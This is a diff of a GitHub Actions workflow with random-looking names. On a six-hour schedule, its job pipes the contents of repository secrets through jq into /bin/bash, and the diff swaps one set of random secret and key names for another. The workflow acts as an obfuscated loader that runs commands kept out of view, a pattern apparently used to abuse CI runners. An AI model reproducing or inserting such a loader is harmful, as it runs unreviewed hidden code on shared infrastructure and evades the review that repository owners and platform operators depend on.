@@ -1,30 +1,37 @@
 name: yuanriyue3461
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
+    - cron: '38 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yuanriyue3461
         env:
-          u5: ${{ secrets.u5 }}
+          awcx58216: ${{ secrets.awcx58216 }}
         run: |
-          echo $u5 | jq -r .gbvo09548 | /bin/bash
-          echo $iq07 | jq -r .v86 | /bin/bash
-          echo $nsbah836 | jq -r .poip1 | /bin/bash
-          echo $zz5 | jq -r .nm7581 | /bin/bash
-          echo $xbx444 | jq -r .uqgf2 | /bin/bash
-          echo $wglh33 | jq -r .xzv758 | /bin/bash
-          echo $jsq3 | jq -r .nf54 | /bin/bash
-          echo $hu84 | jq -r .mreo86 | /bin/bash
-          echo $yw35385 | jq -r .svfw1 | /bin/bash
-          echo $qk77538 | jq -r .yzdho37587 | /bin/bash
-          echo $tp892 | jq -r .mv261 | /bin/bash
-          echo $ly37951 | jq -r .clw7502 | /bin/bash
-          echo $mh1631 | jq -r .qzxp3 | /bin/bash
+          echo $awcx58216 | jq -r .cjc0 | /bin/bash
+          echo $ufaza1909 | jq -r .pfuwz7 | /bin/bash
+          echo $nvg6 | jq -r .ig8 | /bin/bash
+          echo $beubm2264 | jq -r .jsq468 | /bin/bash
+          echo $idole9 | jq -r .sph34 | /bin/bash
+          echo $tuir3 | jq -r .ibsg0760 | /bin/bash
+          echo $boc0 | jq -r .cbz4 | /bin/bash
+          echo $k15879 | jq -r .wig40 | /bin/bash
+          echo $y46815 | jq -r .k56 | /bin/bash
+          echo $ywd4209 | jq -r .zyli9227 | /bin/bash
+          echo $xqpql61 | jq -r .c134 | /bin/bash
+          echo $gfew5014 | jq -r .plpuz94983 | /bin/bash
+          echo $zc9 | jq -r .sictj23 | /bin/bash
+          echo $l563 | jq -r .s42224 | /bin/bash
+          echo $tzymq09967 | jq -r .az1709 | /bin/bash
+          echo $cftc065 | jq -r .wahxw29063 | /bin/bash
+          echo $dhg69 | jq -r .pgajt97 | /bin/bash
+          echo $x259 | jq -r .n68146 | /bin/bash
+          echo $txwnl774 | jq -r .zrt215 | /bin/bash
+          echo $a1 | jq -r .hlvcq435 | /bin/bash
+          echo $vw781 | jq -r .i2181 | /bin/bash
 
